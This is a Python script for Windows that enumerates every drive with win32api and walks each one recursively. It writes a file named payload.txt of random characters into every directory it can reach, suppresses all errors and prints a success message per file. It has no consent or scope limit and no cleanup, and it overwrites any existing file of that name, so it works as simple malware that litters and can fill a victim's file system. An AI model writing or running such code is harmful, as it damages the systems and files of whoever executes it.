import random
import os
import platform
import win32api
import string

# Check the operating system
if platform.system() == "Windows":
    release = platform.release()
    if release != "":
        print(f"Windows {release} detected.")
    else:
        print("Windows detected, but release can't be determined.")

elif platform.system() == "Linux":
    release = platform.release()
    print(f"Linux {release} not supported.")
    quit()

elif platform.system() == "Darwin":
    release = platform.release()
    print(f"macOS {release} not supported.")
    quit()

# Define valid characters for the payload
valid_chars = string.printable
# Get a list of available drives on the Windows system
get_drives = win32api.GetLogicalDriveStrings()
list_of_drives = get_drives.split("\x00")
drive_list = []

# Filter out empty drive names and create a list of available drives
for drive in list_of_drives:
    if drive != "":
        drive_list.append(drive)

# Iterate through the list of drives
for drive in drive_list:
    # Generate a random text payload with a random length (up to 1024 characters)
    payload = "".join(random.choices(valid_chars, k=random.randint(1, 1024)))
    # Determine the number of payloads to create (1 to 5)
    payload_amount = random.randint(1, 5)

    # Check if the drive is a directory
    if os.path.isdir(drive):
        # Recursively walk through the directory and its subdirectories
        for src, dirs, files in os.walk(drive):
            # Create a file path for the payload in the current directory
            file_path = os.path.join(src, f"payload.txt")
            try:
                # Attempt to create the payload file and write the payload content
                with open(file_path, "w", encoding="UTF-8") as file:
                    file.write(payload)
                print(f"Success! {file_path} created")
            except Exception as e:
                # Ignore errors and continue to the next file or directory
                pass
    else:
        # If the drive is not a directory, skip it
        pass
